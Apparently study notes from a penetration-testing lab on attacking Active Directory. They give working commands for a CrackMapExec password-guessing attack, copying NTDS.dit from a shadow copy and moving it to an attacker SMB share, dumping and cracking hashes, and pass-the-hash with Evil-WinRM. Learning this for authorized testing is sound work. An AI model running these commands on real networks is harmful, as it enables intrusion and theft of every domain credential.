It is safe to conclude that if the organization uses Windows, then AD is used to manage those Windows systems. Attacking AD is such an extensive & significant topic that we have multiple modules covering AD.

In this section, we will focus primarily on how we can extract credentials through the use of a  **`dictionary attack against AD accounts` and `dumping hashes` from the `NTDS.dit` file.**

this attack requires the target be reachable over the network. 
it is highly likely that we will need to have a foothold established on the internal network to which the target is connected.
* here are situations where an organization may be using port forwarding to forward the remote desktop protocol (`3389`) or other protocols used for remote access on their [edge router](https://www.cisco.com/c/en/us/products/routers/what-is-an-edge-router.html) to a system on their internal network.
	*  know that most methods covered in this module simulate the steps after an initial compromise, and a foothold is established on an internal network.



Consider the authentication process once a Windows system has been joined to the domain.
This approach will help us better understand the significance of Active Directory and the password attacks it can be susceptible to.
* Once a Windows system is joined to a domain, it will `no longer default to referencing the SAM database to validate logon requests`.
	* The domain-joined system will now send all authentication requests to be validated by the domain controller before allowing a user to log on.
	* This does not mean the SAM database can no longer be used.
		* someone looking to log on using a local account in the SAM database can still do so by specifying the `hostname` of the device proceeded by the `Username` (Example: `WS01/nameofuser`) or with direct access to the device then typing `./` at the logon UI in the `Username` field.
* This is worthy of consideration because we need to be mindful of what system components are impacted by the attacks we perform.
	* it can also give us additional avenues of attack to consider when targeting Windows desktop operating systems or Windows server operating systems with direct physical access or over a network. 
		* Keep in mind that we can also study NTDS attacks by keeping track of this [technique](https://attack.mitre.org/techniques/T1003/003/).


## Dictionary Attacks against AD accounts using CrackMapExec

This method  can be rather `noisy`,  they can generate a lot of network traffic and alerts on the target system as well as eventually get denied due to login attempt restrictions that may be applied through the use of [Group Policy](https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-r2-and-2012/hh831791(v=ws.11)).

When we find ourselves in a scenario where a dictionary attack is a viable next step, we can benefit from trying to `custom tailor` our attack as much as possible.

* we can consider the organization we are working with to perform the engagement against and use searches on various social media websites and look for an employee directory on the company's website.
* One of the first things a new employee will get is a username. Many organizations follow a naming convention when creating employee usernames. Here are some common conventions to consider:
|Username Convention|Practical Example for Jane Jill Doe|
|---|---|
|`firstinitiallastname`|jdoe|
|`firstinitialmiddleinitiallastname`|jjdoe|
|`firstnamelastname`|janedoe|
|`firstname.lastname`|jane.doe|
|`lastname.firstname`|doe.jane|
|`nickname`|doedoehacksstuff|

Often, an email address's structure will give us the employee's username (structure: username@domain). For example, from the email address `jdoe`@`inlanefreight.com`, we see that `jdoe` is the username.

* __A tip from MrB3n: We can often find the email structure by Googling the domain name, i.e., “@inlanefreight.com” and get some valid emails.
	* From there, we can use a script to scrape various social media sites and mashup potential valid usernames.
* Some organizations try to obfuscate their usernames to prevent spraying, so they may alias their username like a907 (or something similar) back to joe.smith

#### Creating a Custom list of Usernames

Let's say we have done our research and gathered a list of names based on publicly available information. We will keep the list relatively short for the sake of this lesson because organizations can have a huge number of employees. Example list of names:

- Ben Williamson
- Bob Burgerstien
- Jim Stevenson
- Jill Johnson
- Jane Doe

We can create a custom list on our attack host using the names above. We can use a command line-based text editor like `Vim` or a graphical text editor to create our list. Our list may look something like this:


```shell-session
canklesmaks@htb[/htb]$ cat usernames.txt 
bwilliamson
benwilliamson
ben.willamson
willamson.ben
bburgerstien
bobburgerstien
bob.burgerstien
burgerstien.bob
jstevenson
jimstevenson
jim.stevenson
stevenson.jim
```

We can manually create our list(s) or use an `automated list generator` such as the Ruby-based tool [Username Anarchy](https://github.com/urbanadventurer/username-anarchy) to convert a list of real names into common username formats

#### Launching the Attack with CrackMapExec
```shell-session
crackmapexec smb 10.129.201.57 -u bwilliamson -p /usr/share/wordlists/fasttrack.txt
```

Once we have discovered some credentials, we could proceed to try to gain remote access to the target domain controller and capture the NTDS.dit file.

## Capturing NTDS.dit

`NT Directory Services` (`NTDS`) is the directory service used with AD to find & organize network resources.

Recall that `NTDS.dit` file is stored at `%systemroot%/ntds` on the domain controllers in a [forest](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/plan/using-the-organizational-domain-forest-model). 

The `.dit` stands for [directory information tree](https://docs.oracle.com/cd/E19901-01/817-7607/dit.html).
	 primary database file associated with AD and stores all domain usernames, password hashes, and other critical schema information.

#### Connecting to a DC with Evil-WinRM
```shell-session
canklesmaks@htb[/htb]$ evil-winrm -i 10.129.201.57  -u bwilliamson -p 'P@55w0rd!'
```

#### Checking Local Group Membership
Once connected, we can check to see what privileges `bwilliamson` has. We can start with looking at the local group membership using the command:

```shell-session
*Evil-WinRM* PS C:\> net localgroup
```
We are looking to see if the account has local admin rights. To make a copy of the NTDS.dit file, we need local admin (`Administrators group`) or Domain Admin (`Domain Admins group`) (or equivalent) rights. We also will want to check what domain privileges we have.
#### Checking User Account Privileges including Domain
```shell-session
*Evil-WinRM* PS C:\> net user bwilliamson
```

#### Creating Shadow Copy of C:
We can use `vssadmin` to create a [Volume Shadow Copy](https://docs.microsoft.com/en-us/windows-server/storage/file-server/volume-shadow-copy-service) (`VSS`) of the C: drive or whatever volume the admin chose when initially installing AD.

*  It is very likely that NTDS will be stored on C: as that is the default location selected at install, but it is possible to change the location.
* We use VSS for this because it is designed to make copies of volumes that may be read & written to actively without needing to bring a particular application or system down 
* VSS is used by many different backup & disaster recovery software to perform operations.
```shell-session
*Evil-WinRM* PS C:\> vssadmin CREATE SHADOW /For=C:
```
#### Copying NTDS.dit from the VSS

```shell-session
*Evil-WinRM* PS C:\NTDS> cmd.exe /c copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2\Windows\NTDS\NTDS.dit c:\NTDS\NTDS.dit
```
Before copying NTDS.dit to our attack host, we may want to use the technique we learned earlier to create an SMB share on our attack host. Feel free to go back to the [[Attacking SAM (security accounts manager)]]section to review that method if needed.

#### Transferring NTDS.dit to Attack Host
```shell-session
*Evil-WinRM* PS C:\NTDS> cmd.exe /c move C:\NTDS\NTDS.dit \\10.10.15.30\CompData 
```

#### A Faster Method: Using cme to Capture NTDS.dit

Alternatively, we may benefit from using CrackMapExec to accomplish the same steps shown above, all with one command. This command allows us to utilize VSS to quickly capture and dump the contents of the NTDS.dit file conveniently within our terminal session.

```shell-session
crackmapexec smb 10.129.201.57 -u bwilliamson -p P@55w0rd! --ntds
```
#### Cracking a Single Hash with Hashcat
```shell-session
canklesmaks@htb[/htb]$ sudo hashcat -m 1000 64f12cddaa88057e06a81b54e73b949b /usr/share/wordlists/rockyou.txt
```
## Pass-the-Hash Considerations

We can still use hashes to attempt to authenticate with a system using a type of attack called `Pass-the-Hash` (`PtH`). A PtH attack takes advantage of the [NTLM authentication protocol](https://docs.microsoft.com/en-us/windows/win32/secauthn/microsoft-ntlm#:~:text=NTLM%20uses%20an%20encrypted%20challenge,to%20the%20secured%20NTLM%20credentials) to authenticate a user using a password hash.
	Instead of `username`:`clear-text password` as the format for login, we can instead use `username`:`password hash`. Here is an example of how this would work:

#### Pass-the-Hash with Evil-WinRM Example
```shell-session
canklesmaks@htb[/htb]$ evil-winrm -i 10.129.201.57  -u  Administrator -H "64f12cddaa88057e06a81b54e73b949b"
```
We can attempt to use this attack when needing to move laterally across a network after the initial compromise of a target. More on PtH will be covered in the module `AD Enumeration and Attacks`.